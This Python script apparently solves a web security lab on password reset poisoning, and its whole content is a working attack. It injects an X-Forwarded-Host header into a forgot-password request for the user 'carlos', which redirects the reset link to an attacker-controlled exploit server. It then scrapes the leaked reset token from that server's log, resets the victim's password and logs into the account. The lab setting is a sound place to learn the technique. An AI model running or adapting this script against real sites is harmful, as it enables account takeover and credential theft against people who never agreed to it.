import sys
import requests
import urllib3
import bs4
import re
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

#Lab: Password reset poisoning via middleware

#extract exploit server link 
def get_exploit_server(session,url):
    response=session.get(url,verify=False)
    soup=bs4.BeautifulSoup(response.text,"html.parser")
    link=str(soup.find("a"))
    return str(link.split(" ")[2].split('"')[1].split('/')[2])

#reset the password for carlos and send email of forget password 
def email_reset(session,url,exploit_server):
    url_reset=url+"/forgot-password"
    data={"username":"carlos"}
    # inject x-forwarded-host to the headers to redirercts user carlos the exploit server 
    header={"X-Forwarded-Host":exploit_server}
    response=session.post(url_reset,verify=False,headers=header,data=data,proxies=proxie)
    if "Please check your email for a reset password link" in response.text:
        print('(+) reset email send successfully . ')
        time.sleep(5)
    else:
        print('(-) error!')

# get token from exploit server log
def get_token(session,serverExploit_link):

    link="https://"+serverExploit_link+"/log"
    response=session.get(link,verify=False,proxies=proxie)
    if "404" in response.text:
        print('(+) Extracting stay logged cookie ....')
        token=re.findall("temp-forgot-password-token=[a-zA-Z0-9]*",response.text)[-1].split("=")[1]
        print('(+) temp-forgot-password-token : %s '%token)
        return token
    else:
        print('(-) Error')
    
# change carlos password 
def change_password(session,url,token):
    url_forget=url+"/forgot-password?temp-forgot-password-token="+token
    data={"temp-forgot-password-token":token,"new-password-1":"password","new-password-2":"password"}
    response=session.post(url_forget,data=data,verify=False,proxies=proxie,allow_redirects=False)
    if response.status_code==302:
        print("(+) Password changed successfully .")
        print('(+) Username : carlos ')
        print('(+) Password : password')
        data_login={"username":"carlos","password":"password"}
        url_login=url+"/login"
        login_response=session.post(url_login,data=data_login,verify=False,proxies=proxie)
        if "Log out" in login_response.text:
            print('(+) Log in to carlos account successfully . ')
            print('(+) Lab solved .')
            sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    link_exploit_server=get_exploit_server(session,url)
    email_reset(session,url,link_exploit_server)
    token=get_token(session,link_exploit_server)
    change_password(session,url,token)

if __name__=="__main__":
    main()